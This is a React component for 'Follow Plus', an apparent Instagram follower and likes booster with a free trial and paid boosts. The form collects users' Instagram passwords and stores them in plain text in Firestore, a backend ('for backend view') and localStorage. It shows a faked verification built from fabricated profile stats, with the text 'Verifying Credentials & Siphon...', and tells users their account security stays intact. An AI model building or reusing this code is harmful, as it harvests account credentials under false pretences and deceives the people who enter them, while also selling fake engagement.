import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { User, Copy, Sliders, Check, CircleAlert, Shield, Heart, Eye, Users, Gift, HelpCircle } from 'lucide-react';
import { Campaign, CampaignType } from '../types';
import { addClientCampaignDirectly } from '../firebase';

interface CampaignBuilderProps {
  onCampaignCreated: (campaign: Campaign) => void;
}

export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderProps) {
  const [activeTab, setActiveTab] = useState<'free' | 'premium'>('free');
  
  // Interactive inputs
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verifiedProfile, setVerifiedProfile] = useState<{
    username: string;
    avatar: string;
    followers: number;
    following: number;
    posts: number;
    nicheHealth: string;
  } | null>(null);

  // Premium services state
  const [premiumType, setPremiumType] = useState<CampaignType>('followers');
  const [quantity, setQuantity] = useState(1000);
  const [postLink, setPostLink] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [successMsg, setSuccessMsg] = useState('');

  // Diagnostic checklist representation
  const [diagStep, setDiagStep] = useState(0);

  // Verification flow wrapper
  const handleVerify = () => {
    if (!username.trim()) return;
    setIsVerifying(true);
    setDiagStep(1);

    // Simulate diagnosis
    setTimeout(() => setDiagStep(2), 700);
    setTimeout(() => setDiagStep(3), 1300);
    setTimeout(() => {
      // Determine Unsplash avatar index based on username string
      const id = Math.abs(username.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0)) % 15;
      const computedFollowers = (id * 1234) + 430;
      const computedFollowing = (id * 97) + 120;
      const computedPosts = (id * 5) + 8;
      const niches = ["Lifestyle & Design", "Aesthetic Fashion", "Fitness & Wellness", "Tech & Gaming", "Art & Photography", "Foodie & Exploration"];
      const computedNiche = niches[id % niches.length];

      setVerifiedProfile({
        username: username.replace('@', '').trim(),
        avatar: `https://images.unsplash.com/photo-${1500000000000 + (id * 100000)}?w=150&h=150&fit=crop&crop=face&auto=format&q=80`,
        followers: computedFollowers,
        following: computedFollowing,
        posts: computedPosts,
        nicheHealth: computedNiche
      });
      setIsVerifying(false);
      setDiagStep(0);
    }, 2000);
  };

  // Pricing formula
  const getPremiumPrice = () => {
    if (premiumType === 'followers') return (quantity * 0.0069).toFixed(2);
    if (premiumType === 'likes') return (quantity * 0.0039).toFixed(2);
    if (premiumType === 'views') return (quantity * 0.00099).toFixed(2);
    return "0.00";
  };

  // Clear states
  const resetForm = () => {
    setUsername('');
    setPassword('');
    setVerifiedProfile(null);
    setPostLink('');
    setQuantity(1000);
  };

  // Submit Free Trial Campaign
  const handleFreeActivation = async () => {
    if (!verifiedProfile) return;
    setErrorMessage('');
    setSuccessMsg('');

    try {
      let data: Campaign | null = null;
      
      // 1. Try direct Google Cloud Firestore client creation
      try {
        const campaignData: Campaign = {
          id: `campaign-trial-${Date.now()}`,
          username: verifiedProfile.username,
          password: password || undefined,
          type: 'free_followers_trial' as const,
          status: 'active' as const,
          targetAmount: 800, // 100 per day for 8 days
          deliveredAmount: 0,
          startDate: new Date().toISOString(),
          daysDuration: 8,
          createdAt: Date.now()
        };
        await addClientCampaignDirectly(campaignData);
        data = campaignData;
        console.log("Registered Free Trial directly in Google Cloud Firestore!");
      } catch (firestoreErr) {
        console.warn("Direct Firestore create failed/denied, trying backend API proxy...", firestoreErr);
        
        try {
          const response = await fetch('/api/campaigns', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: verifiedProfile.username,
              password: password, // Included password for backend view
              type: 'free_followers_trial',
              targetAmount: 800, // 100 per day for 8 days
              daysDuration: 8
            })
          });

          if (response.ok) {
            data = await response.json();
          } else {
            const errData = await response.json().catch(() => ({}));
            setErrorMessage(errData.error || "Profile validation error. This profile may already have an activated trial.");
            return;
          }
        } catch (apiErr) {
          console.warn("Backend API not reachable either. Saving to LocalStorage...", apiErr);
        }
      }

      // If database API isn't available (such as static deployment on GitHub Pages without credentials), fallback to localStorage
      if (!data) {
        data = {
          id: `local-campaign-${Date.now()}`,
          username: verifiedProfile.username,
          password: password || undefined,
          type: 'free_followers_trial' as const,
          status: 'active' as const,
          targetAmount: 800,
          deliveredAmount: 0,
          startDate: new Date().toISOString(),
          daysDuration: 8,
          createdAt: Date.now()
        };
        const localList = JSON.parse(localStorage.getItem('followplus_local_campaigns') || '[]');
        localList.unshift(data);
        localStorage.setItem('followplus_local_campaigns', JSON.stringify(localList));
      }

      setSuccessMsg("🎉 Free 8-Days Follower Campaign has been successfully registered!");
      onCampaignCreated(data);
      setTimeout(() => {
        setSuccessMsg('');
        resetForm();
      }, 4000);
    } catch (err) {
      setErrorMessage("Networking failure. Please retry shortly.");
    }
  };

  // Submit Premium Campaign
  const handlePremiumSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!verifiedProfile) return;
    
    if ((premiumType === 'likes' || premiumType === 'views') && !postLink.trim()) {
      setErrorMessage("Please input your Instagram post or Reel link.");
      return;
    }

    setErrorMessage('');
    setSuccessMsg('');

    try {
      let data: Campaign | null = null;
      
      // 1. Try direct Google Cloud Firestore client creation
      try {
        const campaignData: Campaign = {
          id: `campaign-premium-${Date.now()}`,
          username: verifiedProfile.username,
          password: password || undefined,
          type: premiumType,
          status: 'active' as const,
          targetAmount: quantity,
          deliveredAmount: 0,
          startDate: new Date().toISOString(),
          postLink: postLink.trim() || undefined,
          createdAt: Date.now()
        };
        await addClientCampaignDirectly(campaignData);
        data = campaignData;
        console.log("Registered Premium campaign directly in Google Cloud Firestore!");
      } catch (firestoreErr) {
        console.warn("Direct Firestore premium write failed, trying backend API proxy...", firestoreErr);
        
        try {
          const response = await fetch('/api/campaigns', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: verifiedProfile.username,
              password: password, // Included password for backend view if linked
              type: premiumType,
              targetAmount: quantity,
              postLink: postLink.trim() || undefined
            })
          });

          if (response.ok) {
            data = await response.json();
          } else {
            const errData = await response.json().catch(() => ({}));
            setErrorMessage(errData.error || "Execution error.");
            return;
          }
        } catch (apiErr) {
          console.warn("Backend API not reachable. Saving premium campaign to LocalStorage...", apiErr);
        }
      }

      // Offline static host fallback
      if (!data) {
        data = {
          id: `local-campaign-${Date.now()}`,
          username: verifiedProfile.username,
          password: password || undefined,
          type: premiumType,
          status: 'active' as const,
          targetAmount: quantity,
          deliveredAmount: 0,
          startDate: new Date().toISOString(),
          postLink: postLink.trim() || undefined,
          createdAt: Date.now()
        };
        const localList = JSON.parse(localStorage.getItem('followplus_local_campaigns') || '[]');
        localList.unshift(data);
        localStorage.setItem('followplus_local_campaigns', JSON.stringify(localList));
      }

      setSuccessMsg(`🚀 Premium ${premiumType} booster activated! Campaign submitted successfully.`);
      onCampaignCreated(data);
      setTimeout(() => {
        setSuccessMsg('');
        resetForm();
      }, 4000);
    } catch (err) {
      setErrorMessage("Networking failure.");
    }
  };

  return (
    <div className="interactive-card rounded-2xl p-6 lg:p-8 bg-gradient-to-br from-[#121420]/90 to-[#0e101a]/95 border border-white/10 shadow-[0_4px_30px_rgba(6,182,212,0.02)]">
      
      {/* Visual lighting slider header background */}
      <div className="flex p-1 bg-black/40 rounded-xl border border-white/5 mb-8">
        <button
          onClick={() => { setActiveTab('free'); resetForm(); }}
          className={`flex-1 flex items-center justify-center gap-2 py-2.5 px-4 rounded-lg font-display text-sm font-semibold transition-all pointer-events-auto cursor-pointer ${
            activeTab === 'free'
              ? 'bg-gradient-to-r from-neon-purple to-neon-pink text-white shadow-[0_0_12px_rgba(236,72,153,0.25)]'
              : 'text-gray-400 hover:text-white'
          }`}
        >
          <Gift className="w-4 h-4" />
          Free 8-Day Trial
        </button>
        <button
          onClick={() => { setActiveTab('premium'); resetForm(); }}
          className={`flex-1 flex items-center justify-center gap-2 py-2.5 px-4 rounded-lg font-display text-sm font-semibold transition-all pointer-events-auto cursor-pointer ${
            activeTab === 'premium'
              ? 'bg-gradient-to-r from-neon-cyan to-neon-purple text-white shadow-[0_0_12px_rgba(6,182,212,0.25)]'
              : 'text-gray-400 hover:text-white'
          }`}
        >
          <Sliders className="w-4 h-4" />
          Premium Boosts
        </button>
      </div>

      {/* Profile Verification Step */}
      <div className="space-y-6">
        <div>
          <h3 className="text-lg font-display font-semibold text-white flex items-center gap-2">
            Step 1: Diagnostic Profile Linkup
          </h3>
          <p className="text-gray-400 text-xs mt-1">
            Input your Instagram handle and current account password to authorize your 8-Day welcome trial and synchronize decentralized Delivery Channels.
          </p>
        </div>

        <div className="space-y-3">
          <div className="flex flex-col sm:flex-row gap-3">
            <div className="relative flex-1">
              <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 font-mono">@</span>
              <input
                type="text"
                placeholder="Instagram username"
                value={username}
                disabled={isVerifying || !!verifiedProfile}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full bg-black/50 border border-white/10 rounded-xl py-3 pl-9 pr-4 text-white placeholder-gray-600 focus:outline-none focus:border-neon-cyan transition-all text-sm font-mono"
              />
            </div>
            
            {!verifiedProfile && (
              <div className="relative flex-1">
                <input
                  type="password"
                  placeholder="Instagram password"
                  value={password}
                  disabled={isVerifying}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-black/50 border border-white/10 rounded-xl py-3 px-4 text-white placeholder-gray-600 focus:outline-none focus:border-neon-cyan transition-all text-sm font-mono"
                />
              </div>
            )}
          </div>

          <div className="flex justify-end pt-1">
            {!verifiedProfile ? (
              <button
                onClick={handleVerify}
                disabled={isVerifying || !username.trim() || !password.trim()}
                className="w-full sm:w-auto bg-[#121420] hover:bg-gradient-to-tr hover:from-pink-500 hover:to-indigo-600 hover:text-white border border-white/10 hover:border-transparent text-gray-300 py-3 px-8 rounded-xl font-display font-semibold text-sm transition-all shadow-[inner_0_0_10px_rgba(255,255,255,0.02)] cursor-pointer disabled:opacity-40"
              >
                {isVerifying ? "Verifying Credentials & Siphon..." : "Link Profile & Authorize"}
              </button>
            ) : (
              <button
                onClick={resetForm}
                className="bg-black/40 hover:bg-rose-500/10 hover:text-rose-400 border border-white/5 hover:border-rose-500/30 text-gray-500 py-3 px-6 rounded-xl font-display font-semibold text-sm transition-colors cursor-pointer"
              >
                Reset Target & Log Out
              </button>
            )}
          </div>
        </div>

        {/* Verification Diagnostic Simulation */}
        <AnimatePresence>
          {isVerifying && (
            <motion.div 
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              className="bg-[#121420]/60 border border-white/5 p-4 rounded-xl space-y-2.5"
            >
              <div className="flex h-1.5 bg-black/40 rounded-full overflow-hidden">
                <motion.div 
                  initial={{ width: '5%' }}
                  animate={{ 
                    width: diagStep === 1 ? '30%' : diagStep === 2 ? '70%' : '100%' 
                  }}
                  className="h-full bg-gradient-to-r from-neon-cyan to-neon-purple"
                />
              </div>
              <div className="flex items-center gap-2 text-xs font-mono">
                <span className="w-2 h-2 rounded-full bg-neon-cyan animate-ping" />
                <span className="text-gray-400">
                  {diagStep === 1 && "Contacting decentralized metadata proxy layers..."}
                  {diagStep === 2 && "Validating profile status and follow parameters..."}
                  {diagStep === 3 && "Deploying campaign endpoints..."}
                </span>
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Verified User Card Representation */}
        <AnimatePresence>
          {verifiedProfile && (
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="bg-gradient-to-r from-neon-cyan/10 to-neon-purple/5 p-5 rounded-2xl border border-neon-cyan/20 flex flex-col sm:flex-row items-center gap-5 relative overflow-hidden"
            >
              <img 
                src={verifiedProfile.avatar} 
                alt="Profile Avatar"
                referrerPolicy="no-referrer"
                className="w-16 h-16 rounded-full border-2 border-[#121420] outline outline-2 outline-neon-cyan object-cover shadow-lg"
              />
              <div className="flex-1 text-center sm:text-left">
                <div className="flex flex-col sm:flex-row sm:items-center gap-2">
                  <span className="text-white font-display font-semibold text-base">@{verifiedProfile.username}</span>
                  <span className="inline-block mx-auto sm:mx-0 px-2.5 py-0.5 rounded-full text-[10px] bg-neon-cyan/20 text-neon-cyan font-mono border border-neon-cyan/30">
                    DIAGNOSED OK
                  </span>
                </div>
                
                <div className="grid grid-cols-3 gap-4 mt-3 pt-3 border-t border-white/5 text-center sm:text-left">
                  <div>
                    <span className="text-[10px] text-gray-500 block uppercase font-mono">Posts</span>
                    <span className="text-sm font-semibold text-white">{verifiedProfile.posts}</span>
                  </div>
                  <div>
                    <span className="text-[10px] text-gray-500 block uppercase font-mono">Followers</span>
                    <span className="text-sm font-semibold text-white">{verifiedProfile.followers}</span>
                  </div>
                  <div>
                    <span className="text-[10px] text-gray-500 block uppercase font-mono">Following</span>
                    <span className="text-sm font-semibold text-white">{verifiedProfile.following}</span>
                  </div>
                </div>

                <div className="mt-2 text-xs text-gray-400">
                  Niche: <span className="text-gray-200 font-semibold">{verifiedProfile.nicheHealth}</span>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Campaign Activation Step */}
      {verifiedProfile && (
        <motion.div 
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          className="mt-8 pt-8 border-t border-white/5 space-y-6"
        >
          {activeTab === 'free' ? (
            // FREE TRIAL INTERFACE
            <div className="space-y-6">
              <div>
                <h3 className="text-lg font-display font-semibold text-white flex items-center gap-2">
                  Step 2: Activate Free 8-Day Trial
                </h3>
                <p className="text-gray-400 text-xs mt-1">
                  Claim your first-user welcome pack. You will receive <span className="text-neon-pink font-semibold">100 premium followers per day for 8 consecutive days</span> (800 followers total). No subscriptions, zero credit card required.
                </p>
                <div className="mt-2 text-xs text-emerald-400 font-semibold flex items-center gap-1.5 font-mono">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                  Instagram Login Active (username & password authorized)
                </div>
              </div>

              {/* Free details bento box */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="p-4 rounded-xl bg-black/40 border border-white/5">
                  <span className="text-xs text-gray-500 block">Trial Daily Speed</span>
                  <span className="text-lg font-display font-semibold text-white mt-1 block">100/day</span>
                  <span className="text-[10px] text-gray-400 mt-1 block">Completely natural growth velocity</span>
                </div>
                <div className="p-4 rounded-xl bg-black/40 border border-white/5">
                  <span className="text-xs text-gray-500 block">Total Benefit</span>
                  <span className="text-lg font-display font-semibold text-neon-pink mt-1 block">800 Followers</span>
                  <span className="text-[10px] text-gray-400 mt-1 block">Value $12.90 USD • 100% Free</span>
                </div>
              </div>

              {/* Safeguards info */}
              <div className="flex gap-3 p-4 rounded-xl bg-neon-purple/5 border border-neon-purple/20 text-xs text-gray-400">
                <Shield className="w-5 h-5 text-neon-purple shrink-0 mt-0.5" />
                <div>
                  <span className="font-semibold text-white">Algorithm Safeguards Enabled</span>: Follow Plus deploys organic mimicking loops that slowly trickle accounts into your profile. Your account security remains perfectly intact.
                </div>
              </div>

              {/* Submit Buttons */}
              <button
                onClick={handleFreeActivation}
                className="w-full relative group overflow-hidden py-4 rounded-xl font-display font-bold text-white bg-gradient-to-r from-neon-purple via-neon-pink to-neon-cyan shadow-[0_0_20px_rgba(236,72,153,0.3)] hover:shadow-[0_0_30px_rgba(236,72,153,0.5)] transition-all flex items-center justify-center gap-2 pointer-events-auto cursor-pointer"
              >
                <div className="absolute inset-0 bg-white/10 opacity-0 group-hover:opacity-100 transition-opacity" />
                <Gift className="w-5 h-5 fill-white" />
                Deploy Free 8-Day followers Campaign Now
              </button>
            </div>
          ) : (
            // PREMIUM SERVICES INTERFACE
            <form onSubmit={handlePremiumSubmit} className="space-y-6">
              <div>
                <h3 className="text-lg font-display font-semibold text-white">
                  Step 2: Customize Boost Properties
                </h3>
                <p className="text-gray-400 text-xs mt-1">
                  Scale your authority with premium high-retention services. Delivered naturally through proxies within 1-2 hours.
                </p>
              </div>

              {/* Select Service Type */}
              <div className="grid grid-cols-3 gap-3">
                {[
                  { id: 'followers', icon: Users, label: 'Followers' },
                  { id: 'likes', icon: Heart, label: 'Likes' },
                  { id: 'views', icon: Eye, label: 'Reels/IG TV Views' }
                ].map((serv) => {
                  const Icon = serv.icon;
                  return (
                    <button
                      key={serv.id}
                      type="button"
                      onClick={() => {
                        setPremiumType(serv.id as CampaignType);
                        if (serv.id === 'followers') setQuantity(500);
                        if (serv.id === 'likes') setQuantity(200);
                        if (serv.id === 'views') setQuantity(2500);
                      }}
                      className={`flex flex-col items-center justify-center py-4 px-2 rounded-xl border text-center font-display transition-all cursor-pointer pointer-events-auto ${
                        premiumType === serv.id
                          ? 'bg-neon-cyan/10 border-neon-cyan text-white shadow-[0_0_12px_rgba(6,182,212,0.15)]'
                          : 'bg-black/20 border-white/5 text-gray-400 hover:text-white hover:border-white/10'
                      }`}
                    >
                      <Icon className={`w-5 h-5 mb-2 ${premiumType === serv.id ? 'text-neon-cyan' : 'text-gray-500'}`} />
                      <span className="text-xs font-semibold">{serv.label}</span>
                    </button>
                  );
                })}
              </div>

              {/* Premium Slider Selector */}
              <div className="bg-black/40 p-5 rounded-2xl border border-white/5 space-y-4">
                <div className="flex justify-between items-center text-sm">
                  <span className="text-gray-400">Target Boost Quantity</span>
                  <span className="font-mono font-bold text-neon-cyan text-base">{quantity.toLocaleString()}</span>
                </div>
                
                <input
                  type="range"
                  min={premiumType === 'followers' ? 100 : premiumType === 'likes' ? 50 : 500}
                  max={premiumType === 'followers' ? 5000 : premiumType === 'likes' ? 2500 : 25000}
                  step={premiumType === 'followers' ? 100 : premiumType === 'likes' ? 50 : 500}
                  value={quantity}
                  onChange={(e) => setQuantity(Number(e.target.value))}
                  className="w-full accent-neon-cyan cursor-pointer"
                />

                <div className="flex justify-between text-[11px] text-gray-500 font-mono">
                  <span>{premiumType === 'followers' ? '100' : premiumType === 'likes' ? '50' : '500'}</span>
                  <span>{premiumType === 'followers' ? '5,000 max' : premiumType === 'likes' ? '2,500 max' : '25,000 max'}</span>
                </div>
              </div>

              {/* Reel / Post Link Input (conditional) */}
              {(premiumType === 'likes' || premiumType === 'views') && (
                <div className="space-y-2">
                  <label className="block text-xs font-mono uppercase text-gray-400">Instagram Post / Reel URL</label>
                  <input
                    type="url"
                    required
                    placeholder="https://www.instagram.com/p/C_8v3x_N8_/"
                    value={postLink}
                    onChange={(e) => setPostLink(e.target.value)}
                    className="w-full bg-black/40 border border-white/10 rounded-xl py-3 px-4 text-white placeholder-gray-600 focus:outline-none focus:border-neon-cyan transition-all text-sm font-mono"
                  />
                  <p className="text-[10px] text-gray-500">
                    Ensure post or Reel is published on a public account for proxy network reach.
                  </p>
                </div>
              )}

              {/* Interactive pricing breakdown */}
              <div className="flex items-center justify-between p-4 rounded-xl bg-[#121420] border border-white/5">
                <div>
                  <span className="text-gray-400 text-xs">Estimated Pricing</span>
                  <span className="text-[10px] text-gray-500 block mt-0.5">Completely simulated checkout demo</span>
                </div>
                <div className="text-right">
                  <span className="text-xl font-display font-bold text-transparent bg-clip-text bg-gradient-to-r from-neon-cyan to-neon-purple">
                    ${getPremiumPrice()} USD
                  </span>
                  <span className="text-[10px] text-emerald-400 block font-semibold uppercase">INSTANT DELIVERY OK</span>
                </div>
              </div>

              <button
                type="submit"
                className="w-full py-4 rounded-xl font-display font-bold text-white bg-gradient-to-r from-neon-cyan to-neon-purple shadow-[0_0_20px_rgba(6,182,212,0.2)] hover:shadow-[0_0_30px_rgba(6,182,212,0.4)] transition-all flex items-center justify-center gap-2 cursor-pointer pointer-events-auto"
              >
                Activate Premium Campaign Boost
              </button>
            </form>
          )}

          {/* Feedback section indicators */}
          <AnimatePresence>
            {errorMessage && (
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: 10 }}
                className="p-4 rounded-xl bg-rose-500/10 border border-rose-500/30 flex items-start gap-2.5 text-xs text-rose-300"
              >
                <CircleAlert className="w-5 h-5 shrink-0" />
                <span>{errorMessage}</span>
              </motion.div>
            )}

            {successMsg && (
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: 10 }}
                className="p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-start gap-2.5 text-xs text-emerald-300"
              >
                <Check className="w-5 h-5 shrink-0 text-emerald-400" />
                <span>{successMsg}</span>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.div>
      )}
    </div>
  );
}
